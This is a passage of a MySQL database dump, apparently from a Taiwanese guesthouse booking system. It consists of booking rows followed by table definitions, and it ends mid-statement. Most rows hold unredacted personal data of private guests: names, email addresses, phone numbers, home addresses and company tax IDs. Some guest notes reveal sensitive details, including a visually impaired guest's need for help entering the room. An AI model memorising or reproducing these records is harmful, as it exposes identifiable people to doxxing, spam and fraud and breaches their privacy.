(151, 1679484294, NULL, 1679616000, 1679702400, 1, 4, NULL, NULL, 0, NULL, 2800, 0, 2800, NULL, NULL, NULL, NULL, '文伯', '鍾', 'gy4512@yahoo.com.tw', '', '台東市馬亨亨大道135號', '', '', '', '0973631913', '', '', 1, NULL, NULL, 'arrival'),
(152, 1679492004, NULL, 1679616000, 1679875200, 3, 3, NULL, NULL, 0, NULL, 8000, 0, 8000, NULL, NULL, NULL, NULL, '麗玉', '李', 'liyuhlee@gmail.com', '', '博愛路345號', '950', '臺東市', '', '0988755894 ', '', '', 1, NULL, NULL, 'arrival'),
(156, 1679990584, NULL, 1683244800, 1683331200, 1, 1, NULL, NULL, 0, NULL, 2200, 0, 2200, NULL, NULL, NULL, 1, 'Administrator', '鄭', 'goh2078@goh.org.tw', '', '隨意', '236', '天龍國', '', '0981761985', '', '', 1, NULL, NULL, 'arrival'),
(157, 1681119135, 1681119135, 1682726400, 1682812800, 1, 0, 0, NULL, 0, NULL, 0, 0, 0, NULL, NULL, NULL, NULL, '0', '0', '0', '', '0', '0', '0', '', '0', '', '', 4, NULL, NULL, ''),
(158, 1681119346, 1681119346, 1682553600, 1682640000, 1, 0, 0, NULL, 0, NULL, 0, 0, 0, NULL, NULL, NULL, NULL, '0', '0', '0', '', '0', '0', '0', '', '0', '', '', 4, NULL, NULL, ''),
(159, 1681119396, 1681119396, 1682985600, 1683158400, 2, 0, 0, NULL, 0, NULL, 0, 0, 0, NULL, NULL, NULL, NULL, '0', '0', '0', '', '0', '0', '0', '', '0', '', '', 4, NULL, NULL, ''),
(160, 1681957753, NULL, 1682812800, 1682899200, 1, 1, NULL, NULL, 0, NULL, 1200, 0, 1200, NULL, NULL, NULL, NULL, '慧君', '張', 'zoo0970951371@gmail.com', '', '', '', '', '', '', '', '', 1, NULL, NULL, 'arrival'),
(161, 1681958167, NULL, 1682812800, 1682899200, 1, 2, NULL, NULL, 0, NULL, 1200, 0, 1200, NULL, NULL, NULL, NULL, '慧君', '張', 'zoo0970951371@gmail.com', '', '', '', '', '', '', '', '4/30（日）我預訂2間(原木、簡約）雙人房，不知是否能安排在隔壁連在一起？謝謝！', 1, NULL, NULL, 'arrival'),
(162, 1682576721, NULL, 1682899200, 1683072000, 2, 2, NULL, NULL, 0, NULL, 2400, 0, 2400, NULL, NULL, NULL, NULL, '貞如', '陳', 'jeanjuchen@gmail.com', '', '', '', '', '', '0916681186', '', '', 1, NULL, NULL, 'arrival'),
(163, 1683355607, NULL, 1685750400, 1685836800, 1, 1, NULL, NULL, 0, NULL, 1200, 0, 1200, NULL, NULL, NULL, NULL, '育帆', '詹', 'yutofan@hotmail.com', '', '', '', '', '', '0978758759', '', '', 1, NULL, NULL, 'arrival'),
(164, 1683380805, NULL, 1687392000, 1687478400, 1, 5, NULL, NULL, 0, NULL, 3600, 0, 3600, NULL, NULL, NULL, NULL, '霙淇', '黃', 'voae70@yahoo.com.tw', '', '', '', '', '', '0913860605', '', '', 1, NULL, NULL, 'arrival'),
(165, 1683985034, NULL, 1691884800, 1692057600, 2, 4, NULL, NULL, 0, NULL, 5600, 0, 5600, NULL, NULL, NULL, NULL, '明珍', '韓', 'h19990625@yahoo.com.tw', '', '', '', '', '', '', '', '', 1, NULL, NULL, 'arrival'),
(166, 1684374965, NULL, 1685145600, 1685232000, 1, 2, NULL, NULL, 0, NULL, 1400, 0, 1400, NULL, NULL, NULL, NULL, '玲瑜', '張', 'angela_chang@ginkgolin.com', '林銀杏國際有限公司', '基隆市信義區深澳坑路346之1號', '201', '基隆市', '02-24668138#28', '0953279593', '', '', 1, NULL, NULL, 'arrival'),
(167, 1684375087, NULL, 1685145600, 1685232000, 1, 1, NULL, NULL, 0, NULL, 1400, 0, 1400, NULL, NULL, NULL, NULL, '玲瑜', '張', 'angela_chang@ginkgolin.com', '林銀杏國際有限公司', '基隆市信義區深澳坑路346之1號', '201', '基隆市', '02-24668138#28', '0953279593', '', '', 1, NULL, NULL, 'arrival'),
(168, 1684375272, NULL, 1685145600, 1685232000, 1, 1, NULL, NULL, 0, NULL, 1400, 0, 1400, NULL, NULL, NULL, NULL, '玲瑜', '張', 'angela_chang@ginkgolin.com', '林銀杏國際有限公司', '基隆市信義區深澳坑路346之1號', '201', '基隆市', '02-24668138#28', '0953279593', '', '', 1, NULL, NULL, 'arrival'),
(169, 1684375534, NULL, 1684713600, 1684800000, 1, 1, NULL, NULL, 0, NULL, 1200, 0, 1200, NULL, NULL, NULL, NULL, '志偉', '陳', 'shaqchen77@yahoo.com.tw', '華電聯網股份有限公司', '', '', '', '', '0982628860', '', '發票需打統編 : 84778623', 1, NULL, NULL, 'arrival'),
(170, 1684377287, 1684377287, 1685145600, 1685232000, 1, 0, 0, NULL, 0, NULL, 0, 0, 0, NULL, NULL, NULL, NULL, '00', '00', '00', '', '00', '00', '00', '', '00', '', '', 4, NULL, NULL, ''),
(171, 1684414856, NULL, 1684540800, 1684627200, 1, 2, NULL, NULL, 0, NULL, 1400, 0, 1400, NULL, NULL, NULL, NULL, '麗琴', '羅', 'suey107@yahoo.com.tw', '', '', '', '', '', '0927877008', '', '', 1, NULL, NULL, 'arrival'),
(172, 1684730848, 1684730848, 1685059200, 1685145600, 1, 8, 0, NULL, 0, NULL, 0, 0, 0, NULL, NULL, NULL, NULL, '0', '0', '0', '0', '0', '0', '0', '', '0', '', '', 4, NULL, NULL, ''),
(173, 1684847652, NULL, 1687392000, 1687564800, 2, 1, NULL, NULL, 0, NULL, 5600, 0, 5600, NULL, NULL, NULL, 18, '楊', '仁豪', 'pikachu0405@gmail.com', '', '花蓮縣吉安鄉東昌村東里15街54號', '907', '花蓮縣', '0936832518', '', '', '', 1, NULL, NULL, 'arrival'),
(174, 1684938328, NULL, 1688947200, 1689033600, 1, 1, NULL, NULL, 0, NULL, 1400, 0, 1400, NULL, NULL, NULL, NULL, '啟明', '陳', 'cm8318206@gmail.com', '', '彰化縣員林市中正里育英路57-7號', '510', '員林市', '0939201688', '0939201688', '', '', 1, NULL, NULL, 'arrival'),
(175, 1684987301, 1684993061, 1688342400, 1688428800, 1, 0, 0, NULL, 0, NULL, 0, 0, 0, NULL, NULL, NULL, NULL, '0', '0', '0', '', '0', '0', '0', '', '0', '', '', 4, NULL, NULL, ''),
(176, 1684992960, 1684992960, 1688947200, 1689206400, 3, 0, 0, NULL, 0, NULL, 0, 0, 0, NULL, NULL, NULL, NULL, '0', '0', '0', '', '0', '0', '0', '', '0', '', '', 1, NULL, NULL, ''),
(177, 1684993138, 1684993138, 1688947200, 1689206400, 3, 0, 0, NULL, 0, NULL, 0, 0, 0, NULL, NULL, NULL, NULL, '0', '0', '0', '', '0', '0', '0', '', '0', '', '', 4, NULL, NULL, ''),
(178, 1685756498, NULL, 1689811200, 1690329600, 6, 1, NULL, NULL, 0, NULL, 8400, 0, 8400, NULL, NULL, NULL, NULL, '家寧', '郭', 'sweetann66@hotmail.com', '', 'sweetann66@gmail.com', '330', '桃園區', '0922447727', '0922447727', '', '', 1, NULL, NULL, 'arrival'),
(179, 1685757471, NULL, 1689811200, 1690329600, 6, 1, NULL, NULL, 0, NULL, 8400, 0, 8400, NULL, NULL, NULL, 20, '家寧', '郭', 'sweetann66@hotmail.com', '', '桃園市桃園區新生路42號', '330', '桃園市', '0922447727', '0922447727', '', '', 1, NULL, NULL, 'arrival'),
(180, 1685864462, NULL, 1688169600, 1688256000, 1, 1, NULL, NULL, 0, NULL, 1400, 0, 1400, NULL, NULL, NULL, NULL, '森永', '曾', 'passion8817882@yahoo.com.tw', '', '彰化縣溪湖鎮北聖路117號', '514', '溪湖鎮', '', '0910881270', '', '', 1, NULL, NULL, 'arrival'),
(181, 1685896812, NULL, 1689379200, 1689465600, 1, 8, 1, NULL, 0, NULL, 6400, 0, 6400, NULL, NULL, NULL, NULL, '煜程', '蔡', 'sable20524200200@gmail.com', '', '', '', '', '', '0970840970', '', '', 1, NULL, NULL, 'arrival'),
(182, 1686014944, NULL, 1693008000, 1693094400, 1, 1, NULL, NULL, 0, NULL, 1400, 0, 1400, NULL, NULL, NULL, NULL, '許木生', '許', 'abc868621@gmail.com', '', '', '', '12', '', '0965472737', '', '', 1, NULL, NULL, 'arrival'),
(183, 1686208458, 1686208458, 1689897600, 1690070400, 2, 0, 0, NULL, 0, NULL, 0, 0, 0, NULL, NULL, NULL, NULL, '承翰', '吳', '0', '', '0', '0', '0', '', '0920-350-666', '', '', 1, NULL, NULL, ''),
(184, 1686232477, NULL, 1688688000, 1688860800, 2, 2, NULL, NULL, 0, NULL, 2800, 0, 2800, NULL, NULL, NULL, NULL, '承澔', '吳', 'mdog0213@yahoo.com.tw', '', '台北市北投區自強街53號4樓', '112050', '台北市', '(02)28236728', '0988426796', '', '', 1, NULL, NULL, 'arrival'),
(185, 1686451676, NULL, 1688515200, 1688601600, 1, 5, NULL, NULL, 0, NULL, 3600, 0, 3600, NULL, NULL, NULL, NULL, '啓崇', '柯', 'carey.k6@msa.hinet.net', '', '台中市沙鹿區中山路480巷23號', '43304', '台中市', '04-26623067', '0937219185', '', '', 1, NULL, NULL, 'arrival'),
(186, 1686484172, NULL, 1686700800, 1686873600, 2, 2, NULL, NULL, 0, NULL, 2400, 0, 2400, NULL, NULL, NULL, NULL, '貞如', '陳', 'jeanjuchen@gmail.com', '', '', '', '', '', '0916681186', '', '', 1, NULL, NULL, 'arrival'),
(187, 1686534325, NULL, 1686960000, 1687046400, 1, 1, NULL, NULL, 0, NULL, 1400, 0, 1400, NULL, NULL, NULL, NULL, '柏文', '黃', 'k4280869@gmail.com', '', '', '', '', '', '0933249034', '', '', 1, NULL, NULL, 'arrival'),
(188, 1687063854, NULL, 1687478400, 1687564800, 1, 1, NULL, NULL, 0, NULL, 1400, 0, 1400, NULL, NULL, NULL, NULL, '文萱', '羅', 'coffee00417@gmail.com', '', '', '', '', '', '0963935657', '', '', 1, NULL, NULL, 'arrival'),
(189, 1687099921, NULL, 1690675200, 1690761600, 1, 4, NULL, NULL, 0, NULL, 2800, 0, 2800, NULL, NULL, NULL, NULL, '春雅', '王', '870651@ms.kmuh.org.tw', '', '高雄市左營區至聖路154號5樓', '813', '高雄市', '07-5508010', '0975356499', '', '', 1, NULL, NULL, 'arrival'),
(190, 1687189665, NULL, 1692403200, 1692489600, 1, 2, 2, NULL, 0, NULL, 2800, 0, 2800, NULL, NULL, NULL, NULL, '建霖', '陳', 'ellerycjl@gmail.com', '', '', '', '', '', '0915405170', '', '', 1, NULL, NULL, 'arrival'),
(191, 1687405815, NULL, 1691798400, 1691884800, 1, 2, 2, NULL, 0, NULL, 2800, 0, 2800, NULL, NULL, NULL, 22, '一茹', '羅', 'yir@tmail.ilc.edu.tw', '', '宜蘭縣宜蘭市民族路320號5樓', '260008', '宜蘭', '0912591899', '0912591899', '', '', 1, NULL, NULL, 'arrival'),
(192, 1687745043, NULL, 1690329600, 1690416000, 1, 1, NULL, NULL, 0, NULL, 1400, 0, 1400, NULL, NULL, NULL, NULL, '昌波', '魏', 'navigate61@gmail.com', '財團法人陽光社會福利基金會', '福興村12鄰福德街83號', '973', '吉安鄉', '038350380', '0928817740', '', '發票需開統編 04180692', 1, NULL, NULL, 'arrival'),
(193, 1687828584, NULL, 1688169600, 1688256000, 1, 1, NULL, NULL, 0, NULL, 1400, 0, 1400, NULL, NULL, NULL, NULL, '禹豪', '陳', 'melo85721@gmail.com', '', '', '', '', '', '0976659617', '', '', 1, NULL, NULL, 'arrival'),
(194, 1687964579, NULL, 1690588800, 1690675200, 1, 1, NULL, NULL, 0, NULL, 2800, 0, 2800, NULL, NULL, NULL, NULL, '榮益', '吳', 'longyiw518@gmail.com', '', '', '', '', '', '0921270239', '', '', 1, NULL, NULL, 'arrival'),
(195, 1687975350, NULL, 1691712000, 1691798400, 1, 2, NULL, NULL, 0, NULL, 1400, 0, 1400, NULL, NULL, NULL, NULL, '振平', '羅', 'pin5359@gmail.com', '', '新竹縣湖口鄉德盛村國光街35巷8號9樓', '303107', '新竹縣湖口鄉', '0915190699', '', '', '', 1, NULL, NULL, 'arrival'),
(196, 1688008294, 1688008294, 1688774400, 1688860800, 1, 0, 0, NULL, 0, NULL, 0, 0, 0, NULL, NULL, NULL, NULL, '0', '0', '0', '', '0', '0', '0', '', '0', '', '', 4, NULL, NULL, ''),
(197, 1688008401, 1688008401, 1688947200, 1689033600, 1, 0, 0, NULL, 0, NULL, 0, 0, 0, NULL, NULL, NULL, NULL, '0', '0', '0', '', '0', '0', '0', '', '0', '', '', 1, NULL, NULL, ''),
(198, 1688107808, NULL, 1688256000, 1688342400, 1, 2, NULL, NULL, 0, NULL, 1400, 0, 1400, NULL, NULL, NULL, NULL, '名賢', '莊', 'msc541@gmail.com', '', '台南市南區新興路541號4樓', '702', '台南市', '062654753', '0910870730', '', '需要停車位', 1, NULL, NULL, 'arrival'),
(199, 1688108217, NULL, 1690156800, 1690243200, 1, 2, NULL, NULL, 0, NULL, 1400, 0, 1400, NULL, NULL, NULL, NULL, '曉珊', '游', 'theresayu5433@gmail.com', '', '桃園市平鎮區德育路二段104巷52號4樓', '324', '桃園市', '', '0905689623', '', '會帶一貓一狗寵物入住', 1, NULL, NULL, 'arrival'),
(200, 1688181416, NULL, 1688774400, 1688947200, 2, 2, NULL, NULL, 0, NULL, 2800, 0, 2800, NULL, NULL, NULL, NULL, '貞如', '陳', 'jeanjuchen@gmail.com', '', '', '', '', '', '0916681186', '', '', 1, NULL, NULL, 'arrival'),
(201, 1688269215, NULL, 1688860800, 1688947200, 1, 2, NULL, NULL, 0, NULL, 1400, 0, 1400, NULL, NULL, NULL, NULL, '惠淳', '楊', 'kelly6827@yahoo.com.tw', '', '新北市淡水區民族路116 號11 樓', '251', '', '', '0978837039', '', '', 1, NULL, NULL, 'arrival'),
(202, 1688396147, NULL, 1689379200, 1689465600, 1, 6, 1, NULL, 0, NULL, 5000, 0, 5000, NULL, NULL, NULL, NULL, '佳慧', '林', 'ttnvefh.tw@gmail.com', '', '', '', '', '', '0921369469', '', '', 1, NULL, NULL, 'arrival'),
(203, 1688449610, NULL, 1690588800, 1690761600, 2, 2, NULL, NULL, 0, NULL, 2800, 0, 2800, NULL, NULL, NULL, NULL, '彥澄', '潘', 'aaronnokia@gmail.com', '', '', '', '', '', '0980369997', '', '', 1, NULL, NULL, 'arrival'),
(204, 1688689211, NULL, 1689206400, 1689292800, 1, 2, NULL, NULL, 0, NULL, 1400, 0, 1400, NULL, NULL, NULL, NULL, '嘉蓁', '吳', '7unewoo@gmail.com', '', '', '', '', '', '0963608312 ', '', '', 1, NULL, NULL, 'arrival'),
(205, 1688719095, NULL, 1689120000, 1689206400, 1, 4, NULL, NULL, 0, NULL, 2800, 0, 2800, NULL, NULL, NULL, NULL, 'chih en', 'lin', 'ibearfly@gmail.com', '', '', '', '', '', '0913579130', '', '', 1, NULL, NULL, 'arrival'),
(206, 1688776828, NULL, 1689638400, 1689984000, 4, 3, NULL, NULL, 0, NULL, 11200, 0, 11200, NULL, NULL, NULL, NULL, '愉敏', '張', 'sisi072613@yahoo.com.tw', '永齡希望小學', '台東市正氣北路230巷56弄3號3樓', '950', '台東', '089-358214', '0921846936', '', '需要收據\r\n統編：93504006\r\n抬頭：國立臺東大學', 1, NULL, NULL, 'arrival'),
(207, 1688910312, NULL, 1689292800, 1689465600, 2, 2, 2, NULL, 0, NULL, 5600, 0, 5600, NULL, NULL, NULL, NULL, '俊嘉', '林', 'momo8433@gmail.com', '', '', '', '', '', '0937798848', '', '', 1, NULL, NULL, 'arrival'),
(208, 1689137246, 1689137246, 1690588800, 1690675200, 1, 0, 0, NULL, 0, NULL, 0, 0, 0, NULL, NULL, NULL, NULL, '0', '0', '0', '', '0', '0', '0', '', '0', '', '', 1, NULL, NULL, ''),
(209, 1689137276, 1689137276, 1690588800, 1690675200, 1, 0, 0, NULL, 0, NULL, 0, 0, 0, NULL, NULL, NULL, NULL, '0', '0', '0', '', '0', '0', '0', '', '0', '', '', 1, NULL, NULL, ''),
(210, 1689169919, NULL, 1689984000, 1690070400, 1, 2, NULL, NULL, 0, NULL, 1400, 0, 1400, NULL, NULL, NULL, NULL, '俊漢', '江', '0933682821@yahoo.com.tw', '', '', '', '', '', '0933523821', '', '', 1, NULL, NULL, 'arrival'),
(211, 1689177786, NULL, 1689379200, 1689465600, 1, 1, NULL, NULL, 0, NULL, 1400, 0, 1400, NULL, NULL, NULL, NULL, '俊漢', '江', '0933682821@yahoo.com.tw', '', '', '', '', '', '0933523821', '', '', 1, NULL, NULL, 'arrival'),
(212, 1689222979, NULL, 1689379200, 1689638400, 3, 1, NULL, NULL, 0, NULL, 4200, 0, 4200, NULL, NULL, NULL, NULL, '虹儒', '曾', 'openit711@gmail.com', '', '', '', '', '', '0928917251', '', '2人住宿，7/15-18，謝謝你', 1, NULL, NULL, 'arrival'),
(213, 1689306674, NULL, 1689984000, 1690070400, 1, 2, 2, NULL, 0, NULL, 2800, 0, 2800, NULL, NULL, NULL, NULL, '亞娟', '蔣', 'quiz_34@yahoo.com.tw', '', '', '', '', '', '0966762737', '', '', 1, NULL, NULL, 'arrival'),
(214, 1689308834, NULL, 1689465600, 1689638400, 2, 3, 1, NULL, 0, NULL, 5600, 0, 5600, NULL, NULL, NULL, NULL, '思瑩', '何', 'syingbirds@gmail.com', '', '南港區研究院路二段182巷58弄13號3樓', '115', '台北市', '', '0917760290', '', '', 1, NULL, NULL, 'arrival'),
(215, 1689343799, NULL, 1691107200, 1691280000, 2, 1, NULL, NULL, 0, NULL, 2800, 0, 2800, NULL, NULL, NULL, NULL, '弼盛', '許', 'sheng0812@gmail.com', '', '新北市板橋區中山路一段1號8樓之7', '220', '新北市', '0229594576', '0905617903', '', '抱歉選錯人數是兩個人入住，視障朋友進入房間需協助進房', 1, NULL, NULL, 'arrival'),
(216, 1689417303, NULL, 1691366400, 1691452800, 1, 1, NULL, NULL, 0, NULL, 1400, 0, 1400, NULL, NULL, NULL, NULL, '聖翔', '黃', 'seaatrpass@gmail.com', '', '信華六街20號18樓', '243', '泰山區', '0922923297', '0922923297', '', '網頁填寫有問題，我們是 成人x1, 兒童x1 (小五)，謝謝。', 1, NULL, NULL, 'arrival'),
(217, 1689417600, NULL, 1691366400, 1691452800, 1, 1, 1, NULL, 0, NULL, 1400, 0, 1400, NULL, NULL, NULL, NULL, '聖翔', '黃', 'seaatrpass@gmail.com', '', '', '', '', '', '0922923297', '', '我們會有單車x2需要停放，預計check-in 9:00PM，check-out 9:00AM。', 1, NULL, NULL, 'arrival'),
(218, 1689420328, NULL, 1690588800, 1690675200, 1, 1, NULL, NULL, 0, NULL, 1200, 0, 1200, NULL, NULL, NULL, 23, '翎鳳', '羅', 't31290@gmail.com', '', '', '', '', '', '0902273512', '', '', 1, NULL, NULL, 'arrival'),
(219, 1689513654, NULL, 1692144000, 1692230400, 1, 2, NULL, NULL, 0, NULL, 1400, 0, 1400, NULL, NULL, NULL, NULL, '之玥', '林', 'stillmeat@gmail.com', '', '', '', '', '', '0921127176', '', '', 1, NULL, NULL, 'arrival'),
(220, 1689650749, NULL, 1691798400, 1691884800, 1, 3, NULL, NULL, 0, NULL, 2200, 0, 2200, NULL, NULL, NULL, NULL, '易錦', '楊', 'formosa5323@gmail.com', '', '台南市北區文成二路227巷13號', '704', '台南市', '', '0927282128', '', '', 1, NULL, NULL, 'arrival'),
(221, 1689693569, NULL, 1690502400, 1690675200, 2, 2, NULL, NULL, 0, NULL, 2800, 0, 2800, NULL, NULL, NULL, NULL, '沂璇', '謝', 'emily960102@gmail.com', '', '', '', '', '', '', '', '', 1, NULL, NULL, 'arrival'),
(222, 1689695613, NULL, 1690588800, 1690675200, 1, 1, NULL, NULL, 0, NULL, 2200, 0, 2200, NULL, NULL, NULL, NULL, '靖婷', '黃', 'allie.huang920@gmail.com', '', '', '', '', '', '', '', '', 1, NULL, NULL, 'arrival'),
(223, 1689777570, NULL, 1692835200, 1693094400, 3, 2, NULL, NULL, 0, NULL, 4200, 0, 4200, NULL, NULL, NULL, 24, '家憶', '陳', 'joy1792@hotmail.com', '', '花蓮市中美路117號4樓之一', '970', '花蓮市', '0928554341', '', '', '', 1, NULL, NULL, 'arrival'),
(224, 1689904233, NULL, 1691193600, 1691280000, 1, 3, 1, NULL, 0, NULL, 2800, 0, 2800, NULL, NULL, NULL, NULL, '子斌', '李', 'lwp19800930@gmail.com', '', '桃園市楊梅區文化街189巷39號8樓', '', '', '', '0922466032', '', '', 1, NULL, NULL, 'arrival'),
(225, 1690357477, NULL, 1691625600, 1691712000, 1, 4, NULL, NULL, 0, NULL, 2800, 0, 2800, NULL, NULL, NULL, NULL, '昱伶', '陳', 'cornnotme@gmail.com', '', '', '', '', '', '0981053379', '', '', 1, NULL, NULL, 'arrival'),
(226, 1690362186, NULL, 1690502400, 1690588800, 1, 1, NULL, NULL, 0, NULL, 1400, 0, 1400, NULL, NULL, NULL, NULL, '嘉茗', '吳', 'cygnus3087@gmail.com', '', '花蓮縣吉安鄉稻香村稻興一街80巷1號', '973', '花蓮', '0979112055', '', '', '', 1, NULL, NULL, 'arrival'),
(227, 1690518664, NULL, 1691625600, 1691712000, 1, 1, NULL, NULL, 0, NULL, 1400, 0, 1400, NULL, NULL, NULL, NULL, '嘉茗', '吳', 'cygnus3087@gmail.com', '', '花蓮縣吉安鄉稻香村稻興一街80巷1號', '973', '花蓮', '0979112055', '0979112055', '', '', 1, NULL, NULL, 'arrival'),
(228, 1690633095, NULL, 1692316800, 1692403200, 1, 2, NULL, NULL, 0, NULL, 1400, 0, 1400, NULL, NULL, NULL, NULL, '金生', '沈', 'w895t@outlook.com', '', '', '', '', '', '0912779895', '', '', 1, NULL, NULL, 'arrival'),
(229, 1690886004, NULL, 1692403200, 1692662400, 3, 2, NULL, NULL, 0, NULL, 4200, 0, 4200, NULL, NULL, NULL, NULL, '秀陵', '顏', 'aruay1985@gmail.com', '', '新北市新店區北宜路二段82巷9弄13號5樓', '231', '新北市', '', '0933746939', '', '', 1, NULL, NULL, 'arrival'),
(230, 1690906723, NULL, 1691798400, 1691884800, 1, 5, NULL, NULL, 0, NULL, 4000, 0, 4000, NULL, NULL, NULL, NULL, '坤樺', '蔡', 'tsaikunhua01@gmail.com', '', '', '', '', '', '0919163153', '', '', 1, NULL, NULL, 'arrival'),
(231, 1691132135, NULL, 1691280000, 1691366400, 1, 1, NULL, NULL, 0, NULL, 1400, 0, 1400, NULL, NULL, NULL, 27, '熙眾', '安', 'emu602@gmail.com', '', '桃園市蘆竹區光明路1段113號7樓', '338', '桃園市', '0933215827', '0933215827', '', '', 1, NULL, NULL, 'arrival'),
(232, 1691465034, NULL, 1693008000, 1693094400, 1, 2, 2, NULL, 0, NULL, 2800, 0, 2800, NULL, NULL, NULL, NULL, '興旺', '李', 'leestanly@yahoo.com.tw', '', '民權二路384巷8號3樓', '', '', '', '0912607614', '', '', 1, NULL, NULL, 'arrival'),
(233, 1691468091, NULL, 1691971200, 1692144000, 2, 1, NULL, NULL, 0, NULL, 2800, 0, 2800, NULL, NULL, NULL, NULL, '貞如', '陳', 'jeanjuchen@gmail.com', '', '', '', '', '', '0916681186', '', '', 1, NULL, NULL, 'arrival'),
(234, 1691674859, NULL, 1691798400, 1691884800, 1, 4, NULL, NULL, 0, NULL, 2800, 0, 2800, NULL, NULL, NULL, NULL, '怡芬', '陳', 'yimail321@hotmail.com', '', '南投縣名間鄉松柏街266號', '551', '南投', '', '0928581775', '', '', 1, NULL, NULL, 'arrival'),
(235, 1691768361, NULL, 1693180800, 1693353600, 2, 2, NULL, NULL, 0, NULL, 2800, 0, 2800, NULL, NULL, NULL, NULL, '琬慈', '丁', 'dingwanci1121@gmail.com', '', '', '', '', '', '0965123898', '', '', 1, NULL, NULL, 'arrival'),
(236, 1691806146, NULL, 1692921600, 1693008000, 1, 3, 1, NULL, 0, NULL, 2800, 0, 2800, NULL, NULL, NULL, NULL, '麗雯', '許', 'cathy.hsuwu@gmail.com', '', '', '', '', '', '0935875523', '', '請安排兩間房間同一樓層,或是在隔壁. 謝謝! ', 1, NULL, NULL, 'arrival'),
(237, 1692091663, NULL, 1692489600, 1692576000, 1, 5, NULL, NULL, 0, NULL, 3600, 0, 3600, NULL, NULL, NULL, NULL, '子原', '蔡', 'tzy110247@gmail.com', '', '屏東市莊敬街二段20號4樓之二', '900', '屏東市', '', '0937384412', '', '', 1, NULL, NULL, 'arrival'),
(238, 1692160711, 1692160711, 1692489600, 1692576000, 1, 0, 0, NULL, 0, NULL, 0, 0, 0, NULL, NULL, NULL, NULL, '0', '0', '0', '', '0', '0', '0', '', '0', '', '', 1, NULL, NULL, ''),
(239, 1692160776, 1692160776, 1692316800, 1692662400, 4, 0, 0, NULL, 0, NULL, 0, 0, 0, NULL, NULL, NULL, NULL, '0', '0', '0', '', '0', '0', '0', '', '0', '', '', 1, NULL, NULL, ''),
(240, 1692197087, NULL, 1692489600, 1692576000, 1, 2, 2, NULL, 0, NULL, 2800, 0, 2800, NULL, NULL, NULL, NULL, '啓勲', '王', 'roger060323@gmail.com', '', '彰化市竹中里竹中路213號', '', '', '', '0958380239', '', '', 1, NULL, NULL, 'arrival'),
(241, 1692670346, NULL, 1692921600, 1693008000, 1, 2, NULL, NULL, 0, NULL, 1400, 0, 1400, NULL, NULL, NULL, NULL, '晉宇', '林', 'arthur10203@yahoo.com.tw', '', '碧峰路630巷22號', '542', '南投縣', '', '0912152971', '', '', 1, NULL, NULL, 'arrival'),
(242, 1692687462, 1692687462, 1693008000, 1693094400, 1, 0, 0, NULL, 0, NULL, 0, 0, 0, NULL, NULL, NULL, 2, '0', '0', '0', '', '0', '0', '0', '', '0', '', '', 1, NULL, NULL, ''),
(243, 1692687542, 1692687542, 1692921600, 1693008000, 1, 0, 0, NULL, 0, NULL, 0, 0, 0, NULL, NULL, NULL, NULL, '0', '0', '0', '', '0', '0', '0', '', '0', '', '', 1, NULL, NULL, ''),
(244, 1692753842, NULL, 1693008000, 1693094400, 1, 1, NULL, NULL, 0, NULL, 1200, 0, 1200, NULL, NULL, NULL, NULL, '郡', '洪', 'asskid0603@gmail.com', '', '', '', '', '', '0978077395', '', '', 1, NULL, NULL, 'arrival'),
(245, 1693837285, NULL, 1694131200, 1694217600, 1, 2, 2, NULL, 0, NULL, 2800, 0, 2800, NULL, NULL, NULL, NULL, '筱瑜', '黃', 'junpofish@gmail.com', '', '', '', '', '', '0972007236', '', '', 1, NULL, NULL, 'arrival'),
(246, 1694002815, NULL, 1694131200, 1694217600, 1, 1, NULL, NULL, 0, NULL, 1400, 0, 1400, NULL, NULL, NULL, NULL, '素英', '沙', 'rhevarheva1967@gmail.com', '', '', '', '', '', '0975951799', '', '', 1, NULL, NULL, 'arrival'),
(247, 1694404985, NULL, 1694736000, 1694908800, 2, 2, NULL, NULL, 0, NULL, 2800, 0, 2800, NULL, NULL, NULL, NULL, '貞如', '陳', 'jeanjuchen@gmail.com', '', '', '', '', '', '0916681186', '', '', 1, NULL, NULL, 'arrival'),
(248, 1694439818, NULL, 1695945600, 1696032000, 1, 1, NULL, NULL, 0, NULL, 1400, 0, 1400, NULL, NULL, NULL, NULL, '昭葦', '吳', 'cw15237@gmail.com', '', '', '', '', '', '0975101357', '', '', 1, NULL, NULL, 'arrival'),
(249, 1694517472, NULL, 1694822400, 1694908800, 1, 1, NULL, NULL, 0, NULL, 1200, 0, 1200, NULL, NULL, NULL, NULL, '欣平', '翁', 'apingweng@yahoo.com', '', '', '', '', '', '0916865155', '', '', 1, NULL, NULL, 'arrival'),
(250, 1694838745, 1694838745, 1696550400, 1696896000, 4, 0, 0, NULL, 0, NULL, 0, 0, 0, NULL, NULL, NULL, NULL, '0', '0', '0', '', '0', '0', '0', '', '0', '', '', 1, NULL, NULL, ''),
(251, 1695371672, NULL, 1695513600, 1695772800, 3, 2, NULL, NULL, 0, NULL, 3600, 0, 3600, NULL, NULL, NULL, NULL, '貞如', '陳', 'jeanjuchen@gmail.com', '', '', '', '', '', '0916681186', '', '', 1, NULL, NULL, 'arrival'),
(252, 1695686647, NULL, 1695859200, 1695945600, 1, 1, NULL, NULL, 0, NULL, 1400, 0, 1400, NULL, NULL, NULL, NULL, '先生', '陳', 'babejolie8@gmail.com', '', '', '', '', '0955 231 300', '', '', '我們是兩位成人', 1, NULL, NULL, 'arrival');

-- --------------------------------------------------------

--
-- 資料表結構 `pm_booking_activity`
--

CREATE TABLE `pm_booking_activity` (
  `id` int(11) NOT NULL,
  `id_booking` int(11) NOT NULL,
  `id_activity` int(11) DEFAULT NULL,
  `title` varchar(250) DEFAULT NULL,
  `children` int(11) DEFAULT 0,
  `adults` int(11) DEFAULT 0,
  `duration` varchar(50) DEFAULT NULL,
  `amount` double DEFAULT 0,
  `ex_tax` double DEFAULT 0,
  `tax_rate` double DEFAULT 0,
  `date` int(11) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_general_ci;

-- --------------------------------------------------------

--
-- 資料表結構 `pm_booking_payment`
--

CREATE TABLE `pm_booking_payment` (
  `id` int(11) NOT NULL,
  `id_booking` int(11) NOT NULL,
  `descr` varchar(100) DEFAULT NULL,
  `method` varchar(100) DEFAULT NULL,
  `amount` double DEFAULT 0,
  `date` int(11) DEFAULT NULL,
  `trans` varchar(100) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_general_ci;

-- --------------------------------------------------------

--
-- 資料表結構 `pm_booking_room`
--

CREATE TABLE `pm_booking_room` (
  `id` int(11) NOT NULL,
  `id_booking` int(11) NOT NULL,
  `id_room` int(11) DEFAULT NULL,
  `title` varchar(250) DEFAULT NULL,
  `num` varchar(10) DEFAULT NULL,
